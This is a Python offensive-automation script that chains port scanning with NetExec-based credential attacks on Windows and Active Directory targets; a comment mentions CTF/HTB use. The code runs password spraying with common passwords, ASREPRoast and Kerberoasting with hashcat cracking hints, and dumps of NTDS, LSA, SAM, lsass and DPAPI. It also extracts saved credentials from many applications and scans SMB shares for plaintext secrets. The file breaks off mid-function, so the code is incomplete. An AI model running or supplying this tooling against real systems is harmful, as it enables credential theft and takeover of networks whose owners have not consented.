#!/usr/bin/env python3
# BoberAutoScanner – Turbocharged Edition
# Refactored & extended: bug fixes, hash support, nuclei,
# JWT detection, header fingerprinting, SMB cred scanning, spray,
# output-dir, timeout handling, JSON summary, hashcat hints.

import subprocess
import argparse
import re
import sys
from pathlib import Path
import os
import shutil
from collections import deque
import random
import string
import json
import select
import time
import socket


# ============================================================
# ANSI COLOUR HELPERS
# ============================================================

def _c(text, code):      return f"\033[{code}m{text}\033[0m"
def green(t):            return _c(t, "1;32")
def yellow(t):           return _c(t, "1;33")
def red(t):              return _c(t, "1;31")
def cyan(t):             return _c(t, "1;36")
def white(t):            return _c(t, "1;37")
def magenta(t):          return _c(t, "1;35")
def blue(t):             return _c(t, "1;34")


# ============================================================
# VALIDATION HELPERS
# ============================================================

def is_ipv4_address(value):
    return bool(re.match(r"^\d+\.\d+\.\d+\.\d+$", value))


def is_valid_domain(domain):
    domain = domain.strip().lower().rstrip(".")
    if is_ipv4_address(domain):
        return False
    if domain.startswith("localhost"):
        return False
    IGNORED = ("nmap.org", "example.com", "localhost")
    if any(domain.endswith(s) for s in IGNORED):
        return False
    if "." not in domain:
        return False
    tld = domain.split(".")[-1]
    return tld.isalpha()


# ============================================================
# OUTPUT / REPORTING HELPERS
# ============================================================

def build_target_identifier(target):
    host = target["host"].lower() if target.get("is_domain") else target["host"]
    return f"{target['scheme']}://{host}:{target['port']}"


def write_report_section(fh, section_name, output):
    fh.write("\n" + "=" * 80 + "\n")
    fh.write(f"[ {section_name} ]\n")
    fh.write("=" * 80 + "\n\n")
    fh.write(output + "\n")


def print_section_title(title, color_code="37"):
    print(f"\n\n{'=' * (len(title) + 6)}")
    print(f"\033[1;{color_code}m{title}\033[0m")
    print("=" * (len(title) + 6))


def print_sub_section_title(title, color_code="36"):
    print(f"\n\033[1;{color_code}m{title}\033[0m")
    print("-" * (len(title) + 6))


def move_tree_contents(src_base, dst_base, label):
    if not os.path.exists(src_base):
        return
    for root, _dirs, files in os.walk(src_base):
        rel = os.path.relpath(root, src_base)
        dst_dir = os.path.join(dst_base, rel)
        os.makedirs(dst_dir, exist_ok=True)
        for fname in files:
            src = os.path.join(root, fname)
            dst = os.path.join(dst_dir, fname)
            try:
                shutil.move(src, dst)
                print(f"{green('[LOOT]')} {label}: {dst}")
            except Exception:
                pass


# ============================================================
# TOOL AVAILABILITY CHECK
# ============================================================

def check_tool(name):
    return shutil.which(name) is not None


def warn_missing_tool(name):
    print(f"{yellow('[WARN]')} Tool not found in PATH: {name} – skipping related steps.")


# ============================================================
# USER INTERACTION
# ============================================================

def ask_user(question, default="yes", timeout=8, auto_mode=True):
    if not auto_mode:
        answer = input(question).strip().lower()
        return answer == "y"
    print(f"{question} (default: {default.upper()} in {timeout}s)")
    print("> ", end="", flush=True)
    start = time.time()
    while True:
        if select.select([sys.stdin], [], [], 0.1)[0]:
            return sys.stdin.readline().strip().lower() == "y"
        if time.time() - start > timeout:
            print(f"\n[*] No input. Using default: {default.upper()}")
            return default == "yes"


def run_interruptible_command(cmd, label):
    print(f"\n{yellow(f'[{label}]')} Running: {' '.join(cmd)}")
    print(f"{white('[INFO]')} Press Ctrl+C to skip this scan and continue.\n")
    proc = subprocess.Popen(cmd)
    try:
        proc.wait()
    except KeyboardInterrupt:
        print(f"\n{red(f'[{label}]')} Interrupted – stopping this scan only...")
        proc.terminate()
        proc.wait()
    print(f"\n{yellow(f'[{label}]')} Done – returning to main pipeline.")


def _run(cmd, timeout=120):
    """Run a command with timeout, return CompletedProcess or None on timeout."""
    try:
        return subprocess.run(cmd, capture_output=True, text=True, timeout=timeout)
    except subprocess.TimeoutExpired:
        print(red(f"[-] Command timed out ({timeout}s): {' '.join(cmd[:4])}..."))
        return None


# ============================================================
# RUSTSCAN
# ============================================================

def run_rustscan(target_ip):
    output_file = "rustscan_all-ports_TCP.txt"
    if not check_tool("rustscan"):
        warn_missing_tool("rustscan")
        return None
    print(f"[+] Running RustScan against {target_ip}")
    cmd = [
        "rustscan", "-a", target_ip, "-n",
        "--ulimit", "7000", "-t", "4000", "-b", "2000",
        "--scripts", "none"
    ]
    try:
        with open(output_file, "w") as f:
            subprocess.run(cmd, stdout=f, stderr=subprocess.STDOUT, check=True)
        print(f"[+] RustScan output → {output_file}")
        return output_file
    except subprocess.CalledProcessError:
        print(red("[!] RustScan failed"))
        sys.exit(1)


# ============================================================
# PORT EXTRACTION
# ============================================================

def extract_ports(rustscan_output_file, target_ip):
    print("[+] Extracting open ports from RustScan output")
    with open(rustscan_output_file, "r", errors="ignore") as f:
        content = f.read()
    pattern = rf"{re.escape(target_ip)}\s*->\s*\[(.*?)\]"
    match = re.search(pattern, content)
    if not match:
        print(red("[!] No open ports found."))
        sys.exit(1)
    ports = match.group(1).replace(" ", "")
    print(f"[+] Open ports: {cyan(ports)}")
    return ports


# ============================================================
# NMAP SCANS
# ============================================================

def run_nmap_basic(target_ip, ports):
    output_file = "nmap_all-ports_basic-info_TCP.txt"
    if not check_tool("nmap"):
        warn_missing_tool("nmap")
        return
    print("[+] Running Nmap basic service detection")
    cmd = [
        "nmap", target_ip, "-p", ports,
        "-Pn", "-sV", "--version-all",
        "--scan-delay", "4ms", "-vv", "-n",
        "-oN", output_file
    ]
    try:
        subprocess.run(cmd, check=True)
        print(f"[+] Basic Nmap scan → {output_file}")
    except subprocess.CalledProcessError as e:
        print(red(f"[!] Nmap basic scan failed: {e}"))


def run_nmap_full(target_ip, ports):
    output_file = "nmap_all-ports_all-info_TCP.txt"
    if not check_tool("nmap"):
        warn_missing_tool("nmap")
        return
    print("[+] Running Nmap full aggressive scan (-A)")
    cmd = [
        "sudo", "nmap", target_ip, "-p", ports,
        "-Pn", "-A", "--scan-delay", "4ms", "-vv",
        "-n",
        "-oN", output_file
    ]
    try:
        subprocess.run(cmd, check=True)
        print(f"[+] Full Nmap scan → {output_file}")
    except subprocess.CalledProcessError as e:
        print(red(f"[!] Nmap full scan failed: {e}"))


# ============================================================
# NMAP UDP SCAN
# ============================================================

# Common UDP ports worth scanning in CTF/HTB environments
UDP_PORTS = "53,67,68,69,123,161,162,500,514,520,623,1194,1900,4500,5353,5683"

def run_nmap_udp(target_ip):
    """
    Run a targeted UDP scan on common service ports.
    Returns a set of open UDP port numbers (as strings).
    Only ports with state 'open' are returned — open|filtered is ignored
    because UDP produces many false positives in that state.
    """
    output_file = "nmap_udp_scan.txt"
    if not check_tool("nmap"):
        warn_missing_tool("nmap")
        return set()

    print(f"[+] Running Nmap UDP scan (top UDP ports: {UDP_PORTS})")
    print(f"    {yellow('[NOTE]')} UDP scan is slower — only checking key ports")

    cmd = [
        "sudo", "nmap",
        target_ip,
        "-sU", "-sV", "-sC",
        "--open",                   # only show open (NOT open|filtered)
        "-p", UDP_PORTS,
        "-Pn",
        "--scan-delay", "1s",       # reduce ICMP rate limit issues
        "--max-retries", "2",
        "-oN", output_file
    ]

    print(f"{cyan('[CMD]')} {' '.join(cmd)}")
    try:
        subprocess.run(cmd, check=True)
    except subprocess.CalledProcessError as e:
        print(red(f"[!] UDP scan failed: {e}"))
        return set()

    # Parse open UDP ports from output
    open_udp = set()
    if not os.path.exists(output_file):
        return open_udp

    with open(output_file, "r", errors="ignore") as f:
        for line in f:
            # Match lines like: "161/udp   open  snmp"
            m = re.match(r"^\s*(\d+)/udp\s+open\s+", line)
            if m:
                open_udp.add(m.group(1))

    if open_udp:
        print(f"{green('[+]')} Open UDP ports: {cyan(', '.join(sorted(open_udp, key=int)))}")
    else:
        print("[*] No open UDP ports found.")

    print(f"[+] UDP scan saved → {output_file}")
    return open_udp


# ============================================================
# WINDOWS / AD DETECTION
# ============================================================

WINDOWS_PORTS = {
    "53", "88", "135", "389", "445", "636",
    "3268", "3269", "3389", "5357", "5358",
    "5985", "5986"
}

SNMP_PORTS = {"161", "162"}


def is_windows_likely(port_list):
    return any(p in WINDOWS_PORTS for p in port_list)


def is_snmp_likely(port_list):
    return any(p in SNMP_PORTS for p in port_list)


# ============================================================
# OUTPUT FILENAME BUILDER
# ============================================================

def build_output_filename(tool, username, command_name):
    safe_user = username if username else "anonymous"
    return f"{tool}_{safe_user}_{command_name}.txt"


# ============================================================
# NXC BASE COMMAND  (FIX: hash support added, -k not duplicated)
# ============================================================

def build_nxc_base_cmd(protocol, target_ip, username, password,
                        dc_host, auth_type, hash_value=None):
    username = username or ""
    password = password or ""
    cmd = ["nxc", protocol, target_ip, "-u", username]
    if hash_value:
        cmd += ["-H", hash_value]
    else:
        cmd += ["-p", password]
    cmd += [
        "--dns-server", target_ip,
        "--dns-tcp",
        "--dns-timeout", "3",
        "--kdcHost", dc_host if dc_host else target_ip
    ]
    # -k added once here, never again downstream
    if auth_type == "kerberos":
        cmd.append("-k")
    return cmd


# ============================================================
# BOBER-EXEC WRAPPER
# ============================================================

def run_bober_exec(target_ip, username, password,
                   dc_host=None, kerberos=False, hash_value=None):
    if not check_tool("bober-exec"):
        return ""
    base_cmd = ["bober-exec", "-f", "nmap_all-ports_basic-info_TCP.txt", "-ip", target_ip]
    if hash_value:
        cmd_string = f"-u '{username}' -H '{hash_value}' --threads 1 --timeout 3"
    else:
        cmd_string = f"-u '{username}' -p '{password}' --threads 1 --timeout 3"
    if dc_host:
        cmd_string += f" --dns-server {target_ip} --dns-tcp --kdcHost {dc_host}"
    if kerberos:
        cmd_string += " -k"
    result = _run(base_cmd + ["-c", cmd_string])
    return result.stdout if result else ""


def parse_bober_exec_output(output):
    results = {}
    KNOWN = {"smb", "ldap", "rpc", "winrm", "mssql", "rdp", "vnc", "ftp", "nfs"}
    for line in output.splitlines():
        line = line.strip()
        if not line or line.startswith("[EXEC]"):
            continue
        parts = line.split()
        service = re.sub(r'[^a-z]', '', parts[0].lower())
        if service not in KNOWN:
            continue
        if service not in results:
            results[service] = {"has_plus": False, "has_minus": False}
        if "[+]" in line:
            results[service]["has_plus"] = True
        if "[-]" in line:
            results[service]["has_minus"] = True
    return results


def evaluate_services(parsed):
    return [s for s, d in parsed.items() if d["has_plus"] and not d["has_minus"]]


# ============================================================
# CREDENTIAL ATTEMPT LOGIC
# ============================================================

def attempt(target_ip, user, pwd, label, create_smb_report,
            dc_host, hash_value=None):
    print(f"\n{'─' * 44}")
    print(f"[*] TRYING: {white(label)}")
    print(f"{'─' * 44}\n")

    # NTLM round
    output = run_bober_exec(target_ip, user, pwd, dc_host,
                            kerberos=False, hash_value=hash_value)
    parsed = parse_bober_exec_output(output)
    ntlm_services = evaluate_services(parsed)
    results = {}

    if ntlm_services:
        print(f"{green('[+]')} NTLM success: {', '.join(ntlm_services)}")
        for s in ntlm_services:
            results[s] = {"auth_type": "ntlm"}

    failed = [s for s in parsed if s not in ntlm_services]

    # Kerberos retry for failed services
    if failed:
        print("[*] Retrying failed services with Kerberos...")
        output = run_bober_exec(target_ip, user, pwd, dc_host,
                                kerberos=True, hash_value=hash_value)
        parsed_k = parse_bober_exec_output(output)
        for s in evaluate_services(parsed_k):
            if s not in results:
                print(f"{green('[+]')} Kerberos success: {s}")
                results[s] = {"auth_type": "kerberos"}

    if not results:
        print(red("[-] No successful authentication."))
        return {}

    # Execute service modules
    final = {}
    for service, meta in results.items():
        auth_type = meta["auth_type"]
        print(f"\n[+] Executing {cyan(service)} modules (auth: {auth_type})")
        if service == "ldap":
            execute_ldap_block(target_ip, user, pwd, dc_host, auth_type,
                               hash_value=hash_value)
            final[service] = auth_type
            continue
        svc_results = execute_service(service, target_ip, user, pwd,
                                      dc_host, auth_type, hash_value=hash_value)
        if svc_results is not None:
            final[service] = {"auth_type": auth_type, "results": svc_results}
        if service == "smb" and create_smb_report:
            execute_smb_report(target_ip, user, pwd, dc_host, auth_type,
                               hash_value=hash_value)
    return final


# ============================================================
# WINDOWS STRATEGY
# ============================================================

def execute_windows_strategy(target_ip, username, password,
                              skip_passwordless, create_smb_report,
                              dc_host, hash_value=None):
    print("\n[+] Starting Windows credential strategy...")
    overall = {}
    rounds = []

    if username is not None and (password is not None or hash_value is not None):
        rounds.append(("provided", username, password))

    if not skip_passwordless:
        rounds.append(("anonymous", "", ""))
        rounds.append(("guest", "guest", ""))
    else:
        print("[*] Skipping anonymous/guest rounds (--skip-passwordless-users)")

    for label, user, pwd in rounds:
        hv = hash_value if label == "provided" else None
        overall[label] = attempt(target_ip, user, pwd, label,
                                 create_smb_report, dc_host, hash_value=hv)

    # Password spray if we collected a user list
    if os.path.exists("users.txt") and not skip_passwordless:
        run_smb_spray(target_ip, dc_host)

    # Summary
    print(f"\n{'=' * 44}")
    print(f" {white('WINDOWS CREDENTIAL VALIDATION SUMMARY')} ")
    print(f"{'=' * 44}")
    for label, results in overall.items():
        print(f"\n[{label.upper()}]")
        if not results:
            print("  No successful services.")
            continue
        for svc, status in results.items():
            print(f"  {svc}: {status}")
    print(f"\n{green('[+]')} Windows credential testing complete.\n")


def run_smb_spray(target_ip, dc_host):
    """Quick password spray against collected users.txt."""
    if not check_tool("nxc"):
        return
    COMMON = [
        "Password1", "Welcome1", "Summer2024", "Winter2024",
        "Spring2024", "Autumn2024", "Company123", ""
    ]
    print(f"\n{yellow('[SPRAY]')} Password spray against users.txt...")
    hits_file = "smb_spray_hits.txt"
    for pwd in COMMON:
        cmd = [
            "nxc", "smb", target_ip,
            "-u", "users.txt", "-p", pwd,
            "--continue-on-success", "--no-bruteforce"
        ]
        if dc_host:
            cmd += ["--kdcHost", dc_host]
        print(f"{cyan('[CMD]')} {' '.join(cmd)}")
        result = _run(cmd, timeout=30)
        if not result:
            continue
        hits = [l for l in result.stdout.splitlines() if "[+]" in l]
        if hits:
            print(f"{green('[SPRAY HIT]')}")
            with open(hits_file, "a") as f:
                for h in hits:
                    print(f"  {h}")
                    f.write(h + "\n")
    if os.path.exists(hits_file):
        print(f"{magenta('[REPORT]')} Spray hits → {hits_file}")


# ============================================================
# SMB MODULE
# ============================================================

def build_smb_commands(target_ip, username, password, dc_host,
                        auth_type, hash_value=None):
    username = username or ""
    password = password or ""
    base = build_nxc_base_cmd("smb", target_ip, username, password,
                               dc_host, auth_type, hash_value)
    return [
        {
            "name": "shares",
            "cmd": base + ["--shares"],
            "post_process": dump_smb_shares
        },
        {
            "name": "rid_brute",
            "cmd": base + ["--rid-brute"],
            "parser": parse_smb_rid_brute
        },
        {
            "name": "users_export",
            "cmd": base + ["--users-export", "users.txt"],
            "success_condition": "file",
            "produced_file": "users.txt"
        },
        {
            "name": "pass_pol",
            "cmd": base + ["--pass-pol"],
            "success_condition": "contains",
            "success_marker": "Dumping password info for domain"
        },
    ]


def detect_smb_error(output):
    if "[-]" in output:
        return True, "Error in output"
    return False, None


def parse_smb_rid_brute(output):
    users = []
    for line in output.splitlines():
        if "SidTypeUser" not in line:
            continue
        m = re.search(r"\\([^\\\s]+)\s+\(SidTypeUser\)", line)
        if m:
            users.append(m.group(1))
    return users


def dump_smb_shares(target_ip, username, password, dc_host, hash_value=None):
    folder = "smb_share_dumps"
    os.makedirs(folder, exist_ok=True)
    print("[+] Starting SMB spider (spider_plus)...")
    cmd = [
        "nxc", "smb", target_ip,
        "-M", "spider_plus",
        "-o",
        "EXCLUDE_FILTER='print$,ipc$,c$'",
        f"OUTPUT_FOLDER={folder}",
        "DOWNLOAD_FLAG=True",
        "-u", username or "",
    ]
    if hash_value:
        cmd += ["-H", hash_value]
    else:
        cmd += ["-p", password or ""]
    if dc_host:
        cmd += ["--dns-server", target_ip, "--dns-tcp", "--kdcHost", dc_host]
    print(f"{cyan('[CMD]')} {' '.join(cmd)}")
    result = _run(cmd, timeout=180)
    if result and ("ACCESS_DENIED" in result.stdout.upper() or
                   "STATUS_ACCESS_DENIED" in result.stdout.upper()):
        print(red("[-] SMB spider: access denied."))
        return False
    scan_shares_for_creds(folder)
    print(f"{green('[LOOT]')} SMB spider complete.")
    return True


def scan_shares_for_creds(base_dir):
    """Scan downloaded SMB files for plaintext credentials."""
    if not os.path.exists(base_dir):
        return
    PATTERNS = [
        r"(?i)password\s*[=:]\s*\S+",
        r"(?i)passwd\s*[=:]\s*\S+",
        r"(?i)secret\s*[=:]\s*\S+",
        r"(?i)api[_-]?key\s*[=:]\s*\S+",
        r"(?i)connectionstring\s*[=:]",
        r"(?i)Data Source=.+Password=",
        r"(?i)net use .+ /user:\S+ \S+",
    ]
    TEXT_EXT = {".txt", ".xml", ".config", ".ini", ".cfg", ".ps1",
                ".bat", ".cmd", ".json", ".yaml", ".yml", ".env",
                ".conf", ".properties", ".log"}
    hits = []
    for root, _dirs, files in os.walk(base_dir):
        for fname in files:
            if os.path.splitext(fname)[1].lower() not in TEXT_EXT:
                continue
            fpath = os.path.join(root, fname)
            try:
                with open(fpath, "r", errors="ignore") as f:
                    for lineno, line in enumerate(f, 1):
                        if any(re.search(p, line) for p in PATTERNS):
                            hits.append(f"{fpath}:{lineno}: {line.strip()}")
                            break
            except Exception:
                continue
    if hits:
        out = "smb_cred_scan.txt"
        with open(out, "w") as f:
            f.write("\n".join(hits) + "\n")
        print(f"{green('[LOOT]')} Credential hints in SMB shares → {out}")
        for h in hits[:10]:
            print(f"  {yellow('>>>')} {h}")
        if len(hits) > 10:
            print(f"  ... and {len(hits) - 10} more → see {out}")
    else:
        print("[*] No credential patterns found in SMB shares.")


# ============================================================
# SERVICE EXECUTOR ENGINE
# ============================================================

def execute_service(service, target_ip, username, password,
                    dc_host, auth_type, hash_value=None):
    if service not in SERVICE_EXECUTORS:
        print(f"[*] No executor for '{service}'. Skipping.")
        return None
    print(f"\n[+] Executing {cyan(service)} modules...")
    executor = SERVICE_EXECUTORS[service]
    commands = executor["command_builder"](
        target_ip, username, password, dc_host, auth_type, hash_value)
    error_detector = executor["error_detector"]
    svc_results = {}

    for entry in commands:
        name = entry["name"]
        cmd  = entry["cmd"]
        parser          = entry.get("parser")
        post_process    = entry.get("post_process")
        success_cond    = entry.get("success_condition", "stdout")
        produced_file   = entry.get("produced_file")
        success_marker  = entry.get("success_marker")

        print(f"{cyan('[CMD]')} {' '.join(cmd)}")
        result = _run(cmd)
        if result is None:
            svc_results[name] = "timeout"
            continue
        output = result.stdout

        if success_cond == "file":
            if produced_file and os.path.exists(produced_file):
                final = build_output_filename(service, username, name)
                os.rename(produced_file, final)
                print(f"{green('[+]')} {service}:{name} → {final}")
                svc_results[name] = "success"
            else:
                print(red(f"[-] {service}:{name} failed (no file)"))
                svc_results[name] = "error"
            continue

        if success_cond == "contains":
            if success_marker and success_marker in output:
                fn = build_output_filename(service, username, name)
                with open(fn, "w") as f:
                    f.write(output)
                print(f"{green('[+]')} {service}:{name} → {fn}")
                svc_results[name] = "success"
            else:
                print(f"[-] {service}:{name} no usable data")
                svc_results[name] = "no_result"
            continue

        has_error, reason = error_detector(output)
        fn = build_output_filename(service, username, name)
        if has_error:
            print(red(f"[-] {service}:{name} failed ({reason})"))
            svc_results[name] = "error"
            continue

        print(f"{green('[+]')} {service}:{name} succeeded")
        if parser:
            data = parser(output)
            with open(fn, "w") as f:
                for item in data:
                    f.write(item + "\n")
        else:
            with open(fn, "w") as f:
                f.write(output)
        print(f"    Output → {fn}")

        if post_process:
            post_process(target_ip, username, password, dc_host, hash_value)

        svc_results[name] = "success"
    return svc_results


SERVICE_EXECUTORS = {
    "smb": {
        "command_builder": build_smb_commands,
        "error_detector":  detect_smb_error,
    }
}


# ============================================================
# LDAP ENUMERATION BLOCK
# ============================================================

LDAP_COMMANDS = [
    {"name": "Get SID",                  "args": ["--get-sid"]},
    {"name": "Domain Controllers",       "args": ["--dc-list"]},
    {"name": "Computers",                "args": ["--computers"]},
    {"name": "Domain Admins Group",      "args": ["--groups", "Domain Admins"]},
    {"name": "Admin Count",              "args": ["--admin-count"]},
    {"name": "User Descriptions",        "args": ["-M", "get-desc-users"]},
    {"name": "Trusted for Delegation",   "args": ["--trusted-for-delegation"]},
    {"name": "Find Delegation",          "args": ["--find-delegation"]},
    {"name": "ADCS Servers",             "args": ["-M", "adcs"]},
    {"name": "Entra ID",                 "args": ["-M", "entra-id"]},
    {"name": "Password Settings Objects","args": ["--pso"]},
    {"name": "gMSA Dump",                "args": ["--gmsa"]},
    {"name": "Machine Account Quota",    "args": ["-M", "maq"]},
    {"name": "pre2k",                    "args": ["-M", "pre2k"]},
    {"name": "ASREPRoast",               "args": ["--asreproast", "asreproast.txt"]},
    {"name": "Kerberoasting",            "args": ["--kerberoasting", "kerberoasting.txt"]},
    {"name": "Bloodhound Collection",    "args": ["--bloodhound", "--collection", "All"]},
]


def handle_ldap_loot(name, output):
    # BloodHound ZIP
    if name == "Bloodhound Collection" and "Compressing output into" in output:
        m = re.search(r"Compressing output into (.+\.zip)", output)
        if m:
            zp = m.group(1).strip()
            if os.path.exists(zp):
                dst = os.path.basename(zp)
                shutil.move(zp, dst)
                print(f"{green('[LOOT]')} BloodHound zip → {dst}")
            else:
                print("[!] BloodHound zip path found but file missing.")

    # pre2k
    if name == "pre2k" and re.search(r"Saved to .*\.nxc/modules/pre2k/.*", output):
        move_tree_contents(os.path.expanduser("~/.nxc/modules/pre2k"), "pre2k", "PRE2K")

    # ASREPRoast hashcat hint
    if name == "ASREPRoast" and os.path.exists("asreproast.txt") and \
            os.path.getsize("asreproast.txt") > 0:
        print(f"{green('[LOOT]')} ASREPRoast hashes → asreproast.txt")
        print(f"  {yellow('[HINT]')} hashcat -m 18200 asreproast.txt /usr/share/wordlists/rockyou.txt")

    # Kerberoasting hashcat hint
    if name == "Kerberoasting" and os.path.exists("kerberoasting.txt") and \
            os.path.getsize("kerberoasting.txt") > 0:
        print(f"{green('[LOOT]')} Kerberoasting hashes → kerberoasting.txt")
        print(f"  {yellow('[HINT]')} hashcat -m 13100 kerberoasting.txt /usr/share/wordlists/rockyou.txt  # RC4")
        print(f"  {yellow('[HINT]')} hashcat -m 19700 kerberoasting.txt /usr/share/wordlists/rockyou.txt  # AES256")

    # gMSA
    if name == "gMSA Dump" and "[+]" in output:
        print(f"{green('[LOOT]')} gMSA hash(es) dumped.")
        print(f"  {yellow('[HINT]')} Use evil-winrm -H <gMSA_NTLM>  or  nxc smb -H <hash>")

    # Suspicious descriptions
    if name == "User Descriptions":
        sus = [ln.strip() for ln in output.splitlines()
               if any(kw in ln.lower() for kw in ["pass", "pwd", "secret", "cred", "key", "temp"])]
        if sus:
            print(f"{green('[LOOT]')} Suspicious user descriptions (possible embedded creds):")
            for s in sus:
                print(f"  {yellow('>>>')} {s}")
            with open("ldap_suspicious_descriptions.txt", "w") as f:
                f.write("\n".join(sus) + "\n")


def execute_ldap_block(target_ip, username, password, dc_host,
                        auth_type, hash_value=None):
    safe_user = username if username else "anonymous"
    out_file  = f"ldap_{safe_user}_output.txt"
    print("\n[+] Starting LDAP enumeration block...\n")
    base = build_nxc_base_cmd("ldap", target_ip, username, password,
                               dc_host, auth_type, hash_value)
    with open(out_file, "w") as report:
        for entry in LDAP_COMMANDS:
            name = entry["name"]
            print(f"[LDAP] Running: {name}")
            result = _run(base + entry["args"])
            output = result.stdout if result else "(timed out)\n"
            write_report_section(report, name, output)
            handle_ldap_loot(name, output)
    print(f"\n{magenta('[REPORT]')} LDAP report → {out_file}\n")


# ============================================================
# SMB EXTENDED REPORT
# ============================================================

SMB_REPORT_COMMANDS = [
    {"name": "Active Sessions",      "args": ["--qwinsta"]},
    {"name": "Logged On Users",      "args": ["--loggedon-users"]},
    {"name": "AV & EDR",             "args": ["-M", "enum_av"]},
    {"name": "Password Policy",      "args": ["--pass-pol"]},
    {"name": "Local Groups",         "args": ["--local-group"]},
    {"name": "Lockscreen Doors",     "args": ["-M", "lockscreendoors"]},
    {"name": "Network Interfaces",   "args": ["--interfaces"]},
    {"name": "Tasklist",             "args": ["--tasklist"]},
    {"name": "Shares",               "args": ["--shares"]},
    {"name": "Relay List",           "args": ["--gen-relay-list", "relay_list.txt"]},
    {"name": "Cmd Exec",             "args": ["-x", "whoami"]},
    {"name": "PS Exec",              "args": ["-X", "$PSVersionTable"]},
    {"name": "Delegation RBCD",      "args": ["--delegate", "Administrator"]},
    {"name": "Backup Operator",      "args": ["-M", "backup_operator"]},
    {"name": "DPAPI",                "args": ["--dpapi"]},
    {"name": "DPAPI Cookies",        "args": ["--dpapi", "cookies"]},
    {"name": "DPAPI NoSystem",       "args": ["--dpapi", "nosystem"]},
    {"name": "DPAPI LocalAuth",      "args": ["--local-auth", "--dpapi", "nosystem"]},
    {"name": "Eventlog Creds",       "args": ["-M", "eventlog_creds"]},
    {"name": "KeePass",              "args": ["-M", "keepass_discover"]},
    {"name": "mRemoteNG",            "args": ["-M", "mremoteng"]},
    {"name": "Notepad",              "args": ["-M", "notepad"]},
    {"name": "Notepad++",            "args": ["-M", "notepad++"]},
    {"name": "PuTTY",                "args": ["-M", "putty"]},
    {"name": "RDCMan",               "args": ["-M", "rdcman"]},
    {"name": "NTDS",                 "args": ["--ntds"]},
    {"name": "NTDS Enabled",         "args": ["--ntds", "--enabled"]},
    {"name": "NTDS VSS",             "args": ["--ntds", "vss"]},
    {"name": "NTDSUtil",             "args": ["-M", "ntdsutil"]},
    {"name": "LSA",                  "args": ["--lsa"]},
    {"name": "LSA Secdump",          "args": ["--lsa", "secdump"]},
    {"name": "Lsassy",               "args": ["-M", "lsassy"]},
    {"name": "Nanodump",             "args": ["-M", "nanodump"]},
    {"name": "SAM",                  "args": ["--sam"]},
    {"name": "SAM Secdump",          "args": ["--sam", "secdump"]},
    {"name": "SCCM",                 "args": ["--sccm"]},
    {"name": "SCCM Disk",            "args": ["--sccm", "disk"]},
    {"name": "SCCM WMI",             "args": ["--sccm", "wmi"]},
    {"name": "WAM",                  "args": ["-M", "wam"]},
    {"name": "Veeam",                "args": ["-M", "veeam"]},
    {"name": "VNC",                  "args": ["-M", "vnc"]},
    {"name": "WiFi",                 "args": ["-M", "wifi"]},
    {"name": "WinSCP",               "args": ["-M", "winscp"]},
]


def collect_nxc_logs():
    move_tree_contents(os.path.expanduser("~/.nxc/logs"), "nxc_logs", "NXC logs")


def execute_smb_report(target_ip, username, password, dc_host,
                        auth_type, hash_value=None):
    safe_user = username if username else "anonymous"
    out_file  = f"smb_{safe_user}_report.txt"
    print("\n[+] Starting extended SMB report...\n")
    # FIX: -k already applied inside build_nxc_base_cmd – not added again here
    base = build_nxc_base_cmd("smb", target_ip, username, password,
                               dc_host, auth_type, hash_value)
    with open(out_file, "w") as report:
        for entry in SMB_REPORT_COMMANDS:
            name = entry["name"]
            print(f"[SMB-REPORT] Running: {name}")
            result = _run(base + entry["args"])
            output = result.stdout if result else "(timed out)\n"
            write_report_section(report, name, output)
    collect_nxc_logs()
    print(f"\n{magenta('[REPORT]')} SMB extended report → {out_file}\n")


# ============================================================
# DOMAIN DISCOVERY
# ============================================================

def run_ldap_scan(target_ip):
    print("\n[+] Running LDAP Nmap scan...\n")
    out = "nmap_LDAP.txt"
    cmd = [
        "nmap", target_ip, "-p", "389", "-Pn", "-sV", "--version-all",
        "--script", "*ldap* and (default or discovery or safe or version or vuln)",
        "-vv", "-oN", out
    ]
    subprocess.run(cmd)
    return out


def discover_ad_via_ldap(target_ip):
    print("\n[+] Discovering AD via LDAP...")
    ad_core = {"dns_domain": None, "dc_hosts": set()}
    try:
        ldap_file = run_ldap_scan(target_ip)
        with open(ldap_file, "r", errors="ignore") as f:
            content = f.read()
        m = re.search(r"defaultNamingContext:\s*(DC=.*)", content)
        if m:
            parts = re.findall(r"DC=([^,]+)", m.group(1))
            if parts:
                candidate = ".".join(parts).lower()
                if is_valid_domain(candidate):
                    ad_core["dns_domain"] = candidate
        for host in re.findall(r"dnsHostName:\s*([^\n]+)", content):
            host = host.strip().lower().rstrip(".")
            if is_valid_domain(host):
                ad_core["dc_hosts"].add(host)
        print(f"    DNS Domain : {ad_core['dns_domain']}")
        print(f"    DC Hosts   : {', '.join(ad_core['dc_hosts']) or 'None'}")
    except Exception as e:
        print(red(f"[-] LDAP AD discovery failed: {e}"))
    return ad_core


def strip_traceroute_blocks(content):
    return re.sub(r"TRACEROUTE.*?(?=\n\n|\Z)", "", content, flags=re.DOTALL)


def discover_web_domains(nmap_full_output, target_ip):
    print("\n[+] Discovering web domains...\n")
    web_map = {}
    if not os.path.exists(nmap_full_output):
        print(red(f"[!] {nmap_full_output} not found – skipping web domain discovery."))
        return web_map
    with open(nmap_full_output, "r", errors="ignore") as f:
        content = f.read()
    content = strip_traceroute_blocks(content)
    port_blocks = re.split(r"\n(\d+/tcp\s+open[^\n]*)", content)
    for i in range(1, len(port_blocks), 2):
        port_line = port_blocks[i]
        block     = port_blocks[i + 1]
        pm = re.search(r"(\d+)/tcp", port_line)
        if not pm:
            continue
        port = int(pm.group(1))
        pll  = port_line.lower()
        if not re.search(r"\bhttps?\b", pll):
            continue
        if any(x in pll for x in ["microsoft httpapi", "rpc over http",
                                    "ncacn_http", "wsman", "winrm"]):
            continue
        candidates = []
        for scheme, domain in re.findall(
                r"Did not follow redirect to (https?)://([a-zA-Z0-9.-]+\.[a-zA-Z]{2,})", block):
            candidates.append((domain, scheme))
        for scheme, domain in re.findall(
                r"(https?)://([a-zA-Z0-9.-]+\.[a-zA-Z]{2,})", block):
            candidates.append((domain, scheme))
        for scheme, domain in re.findall(
                r"Location:\s*(https?)://([a-zA-Z0-9.-]+\.[a-zA-Z]{2,})", block):
            candidates.append((domain, scheme))
        for cn in re.findall(r"Subject:\s*commonName=([a-zA-Z0-9.-]+\.[a-zA-Z]{2,})", block):
            if "fallback" not in cn.lower():
                candidates.append((cn, "https"))
        for san in re.findall(r"DNS:([a-zA-Z0-9.-]+\.[a-zA-Z]{2,})", block):
            candidates.append((san, "https"))
        candidates = [
            (d.lower().rstrip("."), s) for d, s in candidates
            if is_valid_domain(d.lower().rstrip("."))
        ]
        if not candidates:
